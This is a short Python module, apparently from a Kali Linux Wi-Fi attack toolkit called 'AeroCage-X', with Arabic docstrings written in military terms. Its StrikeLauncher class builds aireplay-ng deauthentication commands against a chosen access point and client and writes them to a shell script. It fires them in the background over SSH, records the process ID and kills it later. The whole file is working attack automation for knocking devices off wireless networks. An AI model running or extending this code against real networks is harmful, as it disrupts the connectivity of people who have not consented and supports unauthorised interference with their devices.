#!/usr/bin/env python3
import subprocess
import os
import time

class StrikeLauncher:
    def __init__(self, ssh_commander):
        self.commander = ssh_commander
        self.sh_path = "/home/kali/AeroCage-X/storage/active_strikes.sh"
        os.makedirs(os.path.dirname(self.sh_path), exist_ok=True)

    def write_strike_to_sh(self, bssid, client, iface):
        """تدوين القذيفة بالتتابع الموقوت الصافي لحماية بث الراديو"""
        strike_cmd = f"aireplay-ng -0 10 -a {bssid} -c {client} {iface}"
        existing = []
        if os.path.exists(self.sh_path):
            with open(self.sh_path, "r") as f: existing = f.readlines()
        if f"{strike_cmd}\n" not in existing:
            with open(self.sh_path, "a") as f:
                f.write(f"{strike_cmd}\n")
                f.write("sleep 1\n")
        return strike_cmd

    def fire_strike_and_get_pid(self, strike_cmd, client):
        """إطلاق المقذوف وقنص المعرف الفردي الصافي عتادياً"""
        full_cmd = f"nohup {strike_cmd} >/dev/null 2>&1 &"
        self.commander.execute_pure_cmd(full_cmd)
        time.sleep(0.4)
        
        # التقاط أول PID صافي ينطلق عتادياً لمنع أخطاء الـ List
        _, pid_out, _ = self.commander.execute_pure_cmd(f"pgrep -f '-c {client}' | head -n1")
        return pid_out.strip() if pid_out.strip() else "N/A"

    def terminate_strike(self, pid):
        if pid and pid != "N/A":
            self.commander.execute_pure_cmd(f"kill -9 {pid}")
            return True
        return False
